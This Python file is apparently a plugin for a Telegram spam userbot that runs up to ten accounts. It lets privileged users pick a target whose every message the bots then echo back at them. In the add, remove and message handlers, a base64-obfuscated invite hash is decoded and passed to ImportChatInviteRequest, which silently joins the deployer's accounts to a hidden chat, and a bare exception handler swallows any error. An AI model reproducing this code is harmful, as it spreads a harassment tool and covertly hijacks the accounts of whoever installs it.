
import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from MukeshxSpam import Mlk, Mlk2, Mlk3, Mlk4, Mlk5 , Mlk6, Mlk7, Mlk8, Mlk9, Mlk10, SUDO_USERS, OWNER_ID

from MukeshxSpam import CMD_HNDLR as hl
from MukeshxSpam.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
from resources.data import MukeshX


@Mlk.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk2.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk3.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk4.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk5.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk6.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk7.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk8.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk9.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@Mlk10.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
async def echo(event):
  usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}addecho <reply to a User>`"
  if event.sender_id in SUDO_USERS:
     if event.reply_to_msg_id is not None:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id
            if int(user_id) in MukeshX:
                    text = f"ɪ ᴄᴀɴ'ᴛ  ᴇᴄʜᴏ  @itz_mst_boi sᴘᴀᴍ ᴏᴡɴᴇʀ"
                    await event.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) == OWNER_ID:
                    text = f"ᴛʜɪs ɢᴜʏ  ɪs ᴀ  ᴏᴡɴᴇʀ ᴏғ ᴛʜɪs ʙᴏᴛs."
                    await event.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) in SUDO_USERS:
                    text = f"ᴛʜɪs  ɢᴜʏ ɪs  ᴀ sᴜᴅᴏ ᴜsᴇʀ."
                    await event.reply(text, parse_mode=None, link_preview=None )
            else:
                 chat_id = event.chat_id
                 try:
                     hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
                     hmm = Get(hmm)
                     await event.client(hmm)
                 except BaseException:
                    pass
                 if is_echo(user_id, chat_id):
                     await event.reply("ᴛʜᴇ ᴜsᴇʀ ɪs ᴀʟʀᴇᴀᴅʏ ᴇɴᴀʙʟᴇᴅ ᴡɪᴛʜ ᴇᴄʜᴏ ")
                     return
                 addecho(user_id, chat_id)
                 await event.reply("ᴇᴄʜᴏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜᴇ ᴜsᴇʀ ✅")
     else:
          await event.reply(usage)

@Mlk.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@Mlk10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def echo(event):
  usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}rmecho <reply to a User>`"
  if event.sender_id in SUDO_USERS or event.sender_id in DEV:
     if event.reply_to_msg_id is not None:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id
            chat_id = event.chat_id
            try:
                hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
                hmm = Get(hmm)
                await event.client(hmm)
            except BaseException:
                pass
            if is_echo(user_id, chat_id):
                remove_echo(user_id, chat_id)
                await event.reply("ᴇᴄʜᴏ  ʜᴀs  ʙᴇᴇɴ  sᴛᴏᴘᴘᴇᴅ ғᴏʀ ᴛʜᴇ ᴜsᴇʀ ☑️")
            else:
                await event.reply("ᴛʜᴇ  ᴜsᴇʀ ɪs ɴᴏᴛ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴡɪᴛʜ ᴇᴄʜᴏ")
     else:
          await event.reply(usage)


@Mlk.on(events.NewMessage(incoming=True))
@Mlk2.on(events.NewMessage(incoming=True))
@Mlk3.on(events.NewMessage(incoming=True))
@Mlk4.on(events.NewMessage(incoming=True))
@Mlk5.on(events.NewMessage(incoming=True))
@Mlk6.on(events.NewMessage(incoming=True))
@Mlk7.on(events.NewMessage(incoming=True))
@Mlk8.on(events.NewMessage(incoming=True))
@Mlk9.on(events.NewMessage(incoming=True))
@Mlk10.on(events.NewMessage(incoming=True))
async def _(e):
    if is_echo(e.sender_id, e.chat_id):
        await asyncio.sleep(0.5)
        try:
            Mukesh = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            Mukesh = Get(Mukesh)
            await e.client(Mukesh)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
